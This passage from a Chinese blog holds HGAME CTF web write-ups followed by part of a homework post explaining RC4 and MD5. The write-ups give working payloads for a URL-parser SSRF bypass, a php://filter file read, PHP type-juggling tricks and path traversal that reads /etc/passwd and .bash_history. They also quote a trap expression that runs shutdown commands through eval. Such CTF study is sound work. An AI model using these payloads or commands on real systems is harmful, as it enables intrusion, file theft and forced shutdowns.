class="keyword">if</span> ((string)$str5&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 8 fial'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (parse_url($url, PHP_URL_HOST) !== <span class="string">"www.baidu.com"</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 9 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (parse_url($url,PHP_URL_SCHEME) !== <span class="string">"http"</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 10 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line">$ch = curl_init();</span><br><span class="line">curl_setopt($ch,CURLOPT_URL,$url);</span><br><span class="line">$output = curl_exec($ch);</span><br><span class="line">curl_close($ch);</span><br><span class="line"><span class="keyword">if</span>($output === <span class="keyword">FALSE</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 11 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> $output;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>第一个点md5绕过，第二个点是数组绕过，php数组在比较是比任何数字都大，payload</p>
<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="link">http://118.24.3.214:3001?str1=240610708&amp;str2=QNKCDZO&amp;str3</span>[<span class="string"></span>]=a&amp;str4[]=b&amp;H%5fgame[]=5&amp;url=http://@127.0.0.1:80@www.baidu.com/admin.php</span><br></pre></td></tr></table></figure>
<p>用两个@的原因可以参考这篇文章<a href="https://xz.aliyun.com/t/2215#toc-15" target="_blank" rel="noopener">ref</a></p>
<ul>
<li>当url中有多个@符号时，parse_url中获取的host是最后一个@符号后面的host，而libcurl则是获取的第一个@符号之后的。因此当代码对user@eval.com:80@baidu.com </li>
<li>进行解析时，PHP获取的host是baidu.com是允许访问的域名，而最后调用libcurl进行请求时则是请求的eval.com域名，可以造成ssrf绕过<br>此外对于evil@baidu.com这样的域名进行解析时,php获取的host是evil@baidu.com，但是libcurl获取的host却是evil.com</li>
</ul>
<p>可以得到admin.php页面的代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//flag.php</span></span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">'REMOTE_ADDR'</span>] != <span class="string">'127.0.0.1'</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'only localhost can see it'</span>);</span><br><span class="line">&#125;</span><br><span class="line">$filename = $_GET[<span class="string">'filename'</span>]??<span class="string">''</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (file_exists($filename)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"sorry,you can't see it"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents($filename);</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
<p>查看代码可知存在flag.php页面，关键代码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (file_exists($filename)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"sorry,you can't see it"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents($filename);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>当filename是flag.php（即文件存在时），又无法读取到文件，此时可以利用file_get_contents支持多种协议来读取到文件，可以使用php://filter协议，最终payload如下</p>
<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="link">http://118.24.3.214:3001?str1=240610708&amp;str2=QNKCDZO&amp;str3</span>[<span class="string"></span>]=a&amp;str4[]=b&amp;H%5fgame[]=5&amp;url=http://@127.0.0.1:80@www.baidu.com/admin.php?filename=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
<p>flag.php</p>
<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="php"><span class="meta">&lt;?php</span> $flag = hgame</span></span><span class="template-variable">&#123;ThEr4_Ar4_s0m4_Php_Tr1cks&#125;</span><span class="xml"><span class="php"> <span class="meta">?&gt;</span></span></span></span><br></pre></td></tr></table></figure>
<h2 id="PHP-Is-The-Best-Language"><a href="#PHP-Is-The-Best-Language" class="headerlink" title="PHP Is The Best Language"></a>PHP Is The Best Language</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">'secret.php'</span>;</span><br><span class="line"><span class="comment">#echo $flag;</span></span><br><span class="line"><span class="comment">#echo $secret;</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>($_POST[<span class="string">'gate'</span>]) || <span class="keyword">empty</span>($_POST[<span class="string">'key'</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'door'</span>]))&#123;</span><br><span class="line">    $secret = hash_hmac(<span class="string">'sha256'</span>, $_POST[<span class="string">'door'</span>], $secret);</span><br><span class="line">&#125;</span><br><span class="line">$gate = hash_hmac(<span class="string">'sha256'</span>, $_POST[<span class="string">'key'</span>], $secret);</span><br><span class="line"><span class="keyword">if</span> ($gate !== $_POST[<span class="string">'gate'</span>]) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Hacker GetOut!!"</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ((md5($_POST[<span class="string">'key'</span>])+<span class="number">1</span>) == (md5(md5($_POST[<span class="string">'key'</span>])))+<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Wow!!!"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Hacker GetOut!!"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>代码审计题目，核心代码在于</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'door'</span>]))&#123;</span><br><span class="line">    $secret = hash_hmac(<span class="string">'sha256'</span>, $_POST[<span class="string">'door'</span>], $secret);</span><br><span class="line">&#125;</span><br><span class="line">$gate = hash_hmac(<span class="string">'sha256'</span>, $_POST[<span class="string">'key'</span>], $secret);</span><br><span class="line"><span class="keyword">if</span> ($gate !== $_POST[<span class="string">'gate'</span>]) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Hacker GetOut!!"</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们无法控制$secret变量，自然无法计算出对应的哈希值，那么有没有那种带加密输入（door）的哈希与secret值无关呢？在PHP里面这个是存在的，就是<strong>数组(Array)</strong>，由于数组是hash_hmac无法处理的输入类型，所以会返回<strong>null</strong></p>
<p>第二处在于<code>(md5($_POST[&#39;key&#39;])+1) == (md5(md5($_POST[&#39;key&#39;])))+1</code></p>
<p>此处我们可以爆破</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>($i=<span class="number">1</span>;$i&lt;<span class="number">9999999999</span>;$i++)&#123;</span><br><span class="line">	<span class="keyword">if</span> ((md5($i)+<span class="number">1</span>) == (md5(md5($i)))+<span class="number">1</span>) &#123; </span><br><span class="line">		<span class="keyword">echo</span> $i;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>结果为12</p>
<p>最终payload为</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">door[]=<span class="number">12</span>&amp;<span class="type">key</span>=<span class="number">12</span>&amp;gate=<span class="number">4217722</span>a8aee69d5ed50f3e5ed1cceb1feb79784baaaa6bbf53515ce0eb4daaf</span><br></pre></td></tr></table></figure>
<p>flag如下</p>
<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">hgame</span><span class="template-variable">&#123;Php_MayBe_Not_Safe&#125;</span><span class="xml"></span></span><br></pre></td></tr></table></figure>
<h2 id="Baby-Spider"><a href="#Baby-Spider" class="headerlink" title="Baby_Spider"></a>Baby_Spider</h2><p>题目考察我们的爬虫能力，真的做的我胃疼</p>
<p>题目一共30关，40秒内答对30关的数学题即可获得flag</p>
<ul>
<li>1-10<br>需要用token先登录一下，注意要带上UA头，如果不带的话到第十关算式就会变成<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(lambda <span class="strong">__g: [(os.system('shutdown -s -t 0'), (os.system('shutdown now'), None)[1])[1] for __</span>g[<span class="string">'os'</span>] in [<span class="string">(__import__('os', __g, __g))</span>]][0])(globals())#-----=?</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>由eval函数执行之后直接就关机了（这反爬虫机制真的是骚~~）</p>
<ul>
<li>11-20<br>第十一关开始题目就变了，居然修改了css字体，抓取一下css文件如下<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">@<span class="keyword">font-face</span> &#123;</span><br><span class="line">      <span class="attribute">font-family</span>: Ariali;</span><br><span class="line">      <span class="attribute">src</span>: <span class="built_in">url</span>(<span class="string">'/static/Ariali.otf'</span>);</span><br><span class="line">      <span class="attribute">font-weight</span>: normal;</span><br><span class="line">      <span class="attribute">font-style</span>: normal;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>下载字体<br><img src="https://i.loli.net/2019/02/11/5c614ba6c3e49.png" alt=""><br>可以看到数字对应规则变化了，对应置换一下即可</p>
<ul>
<li>21-30<br>此关开始之后，隐藏了真实的数学表达式位置，如果按照题目的计算答案是错的，结果是在css中的after元素下找到了算式，获取之后计算即可</li>
</ul>
<p>最终paylaod如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">token = <span class="string">"KxvEiiWBm41Xe6PTlKS3DnR4vsnfFcXL"</span></span><br><span class="line">headers = &#123;<span class="string">'User-Agent'</span>:<span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0'</span>&#125;</span><br><span class="line"></span><br><span class="line">url1 = <span class="string">"http://111.231.140.29:10000"</span></span><br><span class="line">url2 = <span class="string">"http://111.231.140.29:10000/question"</span></span><br><span class="line">url3 = <span class="string">"http://111.231.140.29:10000/solution"</span></span><br><span class="line">url4=<span class="string">'http://111.231.140.29:10000/statics/style.css'</span></span><br><span class="line"></span><br><span class="line">res = requests.post(url1,data=dict(token=token))</span><br><span class="line">cookies = res.cookies</span><br><span class="line">al_list = <span class="string">'1026943587'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">11</span>):</span><br><span class="line">    <span class="comment"># res = requests.get(url2,cookies=cookies,headers=headers)</span></span><br><span class="line">    print(<span class="string">'-------------round'</span>,i,<span class="string">'---------------'</span>)</span><br><span class="line">    exp = re.findall(<span class="string">r'&lt;span&gt;(.+)&lt;/span'</span>,res.text)[<span class="number">0</span>]</span><br><span class="line">    print(exp)</span><br><span class="line">    data = dict(answer=str(eval(exp[:<span class="number">-2</span>])))</span><br><span class="line">    res = requests.post(url3,cookies=cookies,data=data,headers=headers)</span><br><span class="line">    cookies = res.cookies</span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">11</span>,<span class="number">21</span>):</span><br><span class="line">    print(<span class="string">'-------------round'</span>,i,<span class="string">'---------------'</span>)</span><br><span class="line">    exp = re.findall(<span class="string">r'&lt;span&gt;(.+)&lt;/span'</span>,res.text)[<span class="number">0</span>]</span><br><span class="line">    exp = list(exp)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(len(exp)):</span><br><span class="line">        <span class="keyword">if</span> ord(exp[x])&gt;<span class="number">47</span> <span class="keyword">and</span> ord(exp[x]) &lt; <span class="number">59</span>:</span><br><span class="line">            exp[x] = al_list[ord(exp[x])<span class="number">-48</span>]</span><br><span class="line">    exp = <span class="string">""</span>.join(exp)</span><br><span class="line">    print(exp)</span><br><span class="line">    data = dict(answer=str(eval(exp[:<span class="number">-2</span>])))</span><br><span class="line">    res = requests.post(url3,cookies=cookies,data=data,headers=headers)</span><br><span class="line">    cookies = res.cookies</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">21</span>,<span class="number">31</span>):</span><br><span class="line">    print(<span class="string">'-------------round'</span>,i,<span class="string">'---------------'</span>)</span><br><span class="line">    res = requests.get(url4,cookies=cookies,headers=headers)</span><br><span class="line">    exp = re.findall(<span class="string">r'content:"(.+)"'</span>,res.text)[<span class="number">0</span>]</span><br><span class="line">    print(exp)</span><br><span class="line">    data = dict(answer=str(eval(exp[:<span class="number">-2</span>])))</span><br><span class="line">    res = requests.post(url3,cookies=cookies,data=data,headers=headers)</span><br><span class="line">    cookies = res.cookies</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'hgame'</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        print(res.text)</span><br></pre></td></tr></table></figure>
<p>flag如下：</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;e<span class="number">7</span>b<span class="number">2703</span>a<span class="number">92574012</span><span class="keyword">c</span><span class="number">10</span>a<span class="number">90</span>d<span class="number">0</span><span class="keyword">c</span><span class="number">96051</span>a<span class="number">5</span>b<span class="number">38</span><span class="keyword">c</span><span class="number">8</span>d<span class="number">60</span>a<span class="number">8861</span><span class="keyword">c</span><span class="number">66e7</span>a<span class="number">0898812144083</span>&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Math有趣"><a href="#Math有趣" class="headerlink" title="Math有趣"></a>Math有趣</h2><p>先是一道数学题，到了第二题之后是一个图片，点击图片链接，发现链接有猫腻<code>img/cXVlc3Rpb24ucG5n.php</code>，base64解码之后是<code>question.png</code>，尝试了一下<code>../../../../../etc/passwd</code>(base64编码)，发现可以成功读取文件<br><img src="https://i.loli.net/2019/02/12/5c623f9854da7.png" alt="/etc/passwd"><br>接下来就是探测工作目录了，学到一个东西，可以探测<code>.bash_history</code>，该文件记录了最近的bash命令<code>../../../../../root/.bash_history</code></p>
<p><img src="https://i.loli.net/2019/02/12/5c6240665dab0.png" alt=""></p>
<p>工作目录为<code>/usr/local/tomcat/webapps/ROOT</code></p>
<p>接下来我们可以给链接加<code>=</code>诱发报错</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>test.tan90.me:<span class="number">8080</span><span class="regexp">/img/</span>cXVlc3Rpb24ucG5n=.php</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2019/02/12/5c6240ecc59e8.png" alt=""></p>
<p>最终定位到类目录，读取代码<code>../../../../../usr/local/tomcat/webapps/ROOT/WEB-INF/classes/hgame/controller/MathController.class</code></p>
<p>然后反编译，定位到flag的位置</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping</span>(value=&#123;<span class="string">"/flag"</span>&#125;, method=&#123;org.springframework.web.bind.annotation.RequestMethod.GET&#125;)</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">Flag</span><span class="params">(ModelMap model)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    System.out.println(<span class="string">"This is the last question."</span>);</span><br><span class="line">    System.out.println(<span class="string">"123852^x % 612799081 = 6181254136845 % 612799081"</span>);</span><br><span class="line">    System.out.println(<span class="string">"The flag is hgame&#123;x&#125;.x is a decimal number."</span>);</span><br><span class="line">    model.addAttribute(<span class="string">"flag"</span>, <span class="string">"Flag is not here."</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"flag"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个数学问题可以用<strong>Baby Step Giant Step</strong>算法解决，github上有相关的代码</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">py bsgs.py <span class="number">123852</span> <span class="number">6181254136845</span> <span class="number">612799081</span></span><br></pre></td></tr></table></figure>
<p>可以得到最小的答案是<code>15387368</code></p>
<p>flag如下：<code>hgame{15387368}</code></p>
]]></content>
      
        <categories>
            
            <category> writeup </category>
            
        </categories>
        
        
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[密码学作业记录（二）]]></title>
      <url>/2019/01/15/crypto2/</url>
      <content type="html"><![CDATA[<p>接上篇</p>
<a id="more"></a>
<h1 id="序列密码"><a href="#序列密码" class="headerlink" title="序列密码"></a>序列密码</h1><h2 id="RC4算法"><a href="#RC4算法" class="headerlink" title="RC4算法"></a>RC4算法</h2><p>​RC4算法是一种流加密算法，密钥长度可变。它加解密使用相同的密钥，因此也属于对称加密算法。RC4是有线等效加密（WEP）中采用的加密算法，也曾经是TLS可采用的算法之一。 </p>
<p><strong>算法原理：</strong></p>
<p>​RSA算法原理非常简单，256字节的状态向量S= {0，1，…，255}，用比特字节表示为S= {00000000, 00000001, ….，11111111}。用一个可变长度为1~256字节（8~8048位）的密钥来初始化256字节的状态向量S={S[0], S[1], …, S[255]}，任何时候，S都包含0~255的8位无符号数的排列组合。加密和解密时，密码流中的每一个字节k由S产生，通过系统的方式随机从S的256个元素中选取一个。每产生一个字节k，S的元素都要被再次排列。具体步骤如下:<br>​    </p>
<ul>
<li><p>步骤一：S向量原状态：  </p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">​S=[<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,...,<span class="number">255</span>]</span><br></pre></td></tr></table></figure>
</li>
<li><p>步骤二：创建临时向量T（256位），如果密钥K的长度为256位，则直接将K赋给T，否则一直重复复制K，直到填满256位的向量T </p>
</li>
<li>步骤三：接下来我们使用T向量来产生S的初始排列。这个过程从S[0]开始一直处理到S[255]，同时对每个S[i]，根据T[i指定的方案将S[i]与S的另一个元素进行交换： </li>
<li>步骤四：密码流产生。一旦S向量的初始排列完成后，密钥就不再被使用。接下来就是使用S自身来不断输出伪随机密码流的过程了。 </li>
<li>步骤五：加密。将步骤四中获得的随机字节k与明文的下一字节做异或运算，产生的字节即为对应的密文字节。 </li>
</ul>
<p>​解密时，由于加密只是使用密码流对明文做了异或运算，因此解密过程只需要使用相同步骤产生密码流并对密文进行同样的异或运算即可得到加密前的明文。 </p>
<p><strong>代码如下：</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">s = []</span><br><span class="line">t = []</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化s</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">	s.append(i);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 秘钥</span></span><br><span class="line"><span class="comment"># 通常取16字节</span></span><br><span class="line">k = [<span class="number">1</span>,<span class="number">45</span>,<span class="number">12</span>,<span class="number">12</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">123</span>,<span class="number">45</span>,<span class="number">78</span>,<span class="number">95</span>,<span class="number">65</span>,<span class="number">23</span>,<span class="number">44</span>,<span class="number">55</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 为暂时向量t赋值</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">	t.append(k[i % len(k)])</span><br><span class="line"></span><br><span class="line">j = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">	j = (j+s[i]+t[i]) % <span class="number">256</span></span><br><span class="line">	s[i],s[j] = s[j],s[i]</span><br><span class="line"></span><br><span class="line">f = open(<span class="string">'a.txt'</span>,<span class="string">'rb'</span>)</span><br><span class="line">text = f.read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 产生密钥流</span></span><br><span class="line">q = []</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">j = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> r <span class="keyword">in</span> range(len(text)):</span><br><span class="line">	i = (i+<span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">	j = (j+s[i]) % <span class="number">256</span></span><br><span class="line">	s[i],s[j] = s[j],s[i]</span><br><span class="line">	t = (s[i] + s[j]) % <span class="number">256</span></span><br><span class="line">	q.append(s[t])</span><br><span class="line"></span><br><span class="line">cipher = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(text)):</span><br><span class="line">	t = (q[i] ^ text[i]) % <span class="number">128</span></span><br><span class="line">	cipher += chr(t)</span><br><span class="line"></span><br><span class="line">plain = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(text)):</span><br><span class="line">	t = (q[i] ^ ord(cipher[i])) % <span class="number">128</span></span><br><span class="line">	plain += chr(t)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">"d"</span>:</span><br><span class="line">	print(<span class="string">"plain: "</span>)</span><br><span class="line">	print(plain)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	print(<span class="string">"cipher: "</span>)</span><br><span class="line">	print(base64.b64encode(cipher.encode(<span class="string">'utf-8'</span>)).decode(<span class="string">'utf-8'</span>))</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>
<p><strong>实例演示：</strong></p>
<p>​    代码中加密的是一段英文文本，密文转为base64编码存储</p>
<p><img src="crypto2/1.png" alt="demo"></p>
<p><strong>安全性分析</strong></p>
<p>​    由于RC4算法加密采用的是xor异或运算，所以一旦子密钥序列出现了重复，密文就有可能被破解。 那么，RC4算法生成的子密钥序列是否会出现重复呢？由于存在部分弱密钥，使得子密钥序列在不到100万字节内就发生了完全的重复，如果是部分重复，则可能在不到10万字节内就能发生重复。所以在使用中应该对密钥进行检查。</p>
<p>​    根据目前的分析结果，没有任何的分析对于密钥长度达到128位的RC4有效，目前主要的攻击方法还是穷举攻击，所以到目前为止，RC4还算一个安全的加密算法。</p>
<p>​    2015年，比利时研究人员Mathy Vanhoef及Frank Piessens，公布了针对RC4加密算法的新型攻击程式，可在75小时内取得cookie的内容。  </p>
<p><strong>实用性分析</strong></p>
<p>​    RC4算法等序列密码加密过程较之分组密码而言相对简单，实现起来相对容易，在加密效率上对分组密码的优势是不言而喻的。此外，对于需要加密/解密数据流的应用，比如在数据通信信道或浏览器/网络链路上，流密码可能是更好的选择 。</p>
<hr>
<p>​    流密码在安全性强度上不逊分组密码，而加密速率又远优于后者，那是不是说明流密码可以完全取代分组密码呢？很可惜，答案是否定的。 </p>
<p>​    众所周知，分组密码的设计关键在于加解密算法，是明文和密文在密钥的控制下尽可能复杂，而序列密码的设计关键在于密钥序列产生器，使生成的密钥序列具有不可预测性。而密码序列产生器，也就是伪随机数字节流的产生，依赖种子（密钥）和伪随机函数，而如果种子和伪随机函数不变的情况下，每次产生的伪随机数字节流都是一样的。如果每次都用同样的密钥作为PRF的输入，产生同样的密码流来与两个不同的明文流分别进行异或运算得到两个密文流，那么将这两个密文流进行异或，结果就是两个原始明文的异或值。如果明文是文本字符串或其他已知其性质的字节流，那么密码破解很可能会成功。因此，对于这些已知性质的字节流进行流密码加密，密钥就不能被重复使用了。在这一点上，分组密码的优点就体现出来了。 </p>
<h1 id="哈希函数"><a href="#哈希函数" class="headerlink" title="哈希函数"></a>哈希函数</h1><p>​    哈希函数的单向性，压缩性，抗碰撞性等特点使得它能够解决实际应用中很多棘手的安全问题，诸如数字签名，文件指纹等。</p>
<h2 id="MD5算法"><a href="#MD5算法" class="headerlink" title="MD5算法"></a>MD5算法</h2><p>​    MD5(Message Digest Algorithm 5)，为计算机安全领域广泛使用的一种散列函数，用以提供消息的完整性保护。 </p>
<p>​    MD5是一种信息摘要算法，MD5算法对输入任意长度的消息进行运行，通过特定的hash散列方法将文本信息转换成产生一个128位的消息摘要，压缩+加密+hash算法的结合体，是绝对不可逆的。</p>
<p><strong>算法原理：</strong><br>​</p>
<ul>
